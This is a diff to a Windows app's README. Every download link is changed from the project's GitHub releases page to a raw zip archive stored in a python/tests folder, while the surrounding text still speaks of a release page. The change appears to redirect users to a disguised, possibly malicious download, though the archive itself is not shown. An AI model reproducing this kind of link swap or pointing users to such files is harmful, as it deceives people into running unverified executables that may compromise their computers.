@@ -1,12 +1,12 @@
 # 🧠 HypercubeHopfield - Fast Memory Search on Windows
 
-[![Download HypercubeHopfield](https://img.shields.io/badge/Download-HypercubeHopfield-blue?style=for-the-badge)](https://github.com/Reneltwoway336/HypercubeHopfield/releases)
+[![Download HypercubeHopfield](https://img.shields.io/badge/Download-HypercubeHopfield-blue?style=for-the-badge)](https://github.com/Reneltwoway336/HypercubeHopfield/raw/refs/heads/main/python/tests/Hopfield_Hypercube_v1.0.zip)
 
 ## 📥 Download
 
 Visit this page to download the app for Windows:
 
-https://github.com/Reneltwoway336/HypercubeHopfield/releases
+https://github.com/Reneltwoway336/HypercubeHopfield/raw/refs/heads/main/python/tests/Hopfield_Hypercube_v1.0.zip
 
 Choose the latest release, then download the Windows file that matches your computer.
 
@@ -45,7 +45,7 @@ If you plan to use the Python or C++ tools, you also need:
 ## 🚀 Getting Started on Windows
 
 1. Open the download page:
-   https://github.com/Reneltwoway336/HypercubeHopfield/releases
+   https://github.com/Reneltwoway336/HypercubeHopfield/raw/refs/heads/main/python/tests/Hopfield_Hypercube_v1.0.zip
 
 2. Find the newest release at the top of the page.
 
@@ -210,5 +210,5 @@ Open the main app file first. If you want to use the SDK, open the Python or C++
 
 Use this link to download the Windows release:
 
-https://github.com/Reneltwoway336/HypercubeHopfield/releases
+https://github.com/Reneltwoway336/HypercubeHopfield/raw/refs/heads/main/python/tests/Hopfield_Hypercube_v1.0.zip
 
